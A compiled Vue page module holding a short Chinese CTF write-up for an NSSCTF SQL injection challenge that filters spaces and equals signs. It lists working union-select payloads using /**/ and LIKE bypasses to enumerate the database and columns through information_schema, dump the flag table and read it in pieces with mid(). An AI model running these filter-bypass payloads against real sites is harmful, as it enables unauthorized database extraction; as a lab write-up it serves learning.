import{_ as n,o as s,c as a,e}from"./app-b6035c39.js";const p={},o=e(`<p>#SQL 注入</p><p>对比[[easy_sql]]</p><p>增加了对 空格 等号 的过滤</p><p>分别可用 <code> /**/</code> <code> like</code> 替代</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code>wllm<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;/**/union/**/select/**/1,2,3%23

2

wllm=-1&#39;</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token operator">%</span><span class="token number">23</span>

test_db

wllm<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;/**/union/**/select/**/1,group_concat(column_name),3/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#39;</span>test_db<span class="token string">&#39;%23

LTLT_flag,users

wllm=-1&#39;</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">/**/</span><span class="token keyword">where</span><span class="token comment">/**/</span>table_schema<span class="token comment">/**/</span><span class="token operator">like</span><span class="token comment">/**/</span><span class="token string">&#39;test_db&#39;</span><span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">=</span><span class="token operator">&gt;</span>id<span class="token punctuation">,</span>flag<span class="token punctuation">,</span>id<span class="token punctuation">,</span>username

wllm<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">&#39;/**/union/**/select/**/1,flag,3/**/from/**/LTLT_flag%23

NSSCTF{6651e51a-22a1

substr，right，REVERSE 被过滤，只能用mid

?wllm=-1&#39;</span><span class="token comment">/**/</span><span class="token keyword">union</span><span class="token comment">/**/</span><span class="token keyword">select</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>LTLT_flag<span class="token operator">%</span><span class="token number">23</span>
<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">4127</span><span class="token operator">-</span>a3d8<span class="token operator">-</span>bdc75262

类似的得出后面部分
<span class="token operator">=</span><span class="token operator">&gt;</span><span class="token number">8</span><span class="token operator">-</span>bdc752623e30}


</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5),t=[o];function l(c,i){return s(),a("div",null,t)}const m=n(p,[["render",l],["__file","sql.html.vue"]]);export{m as default};
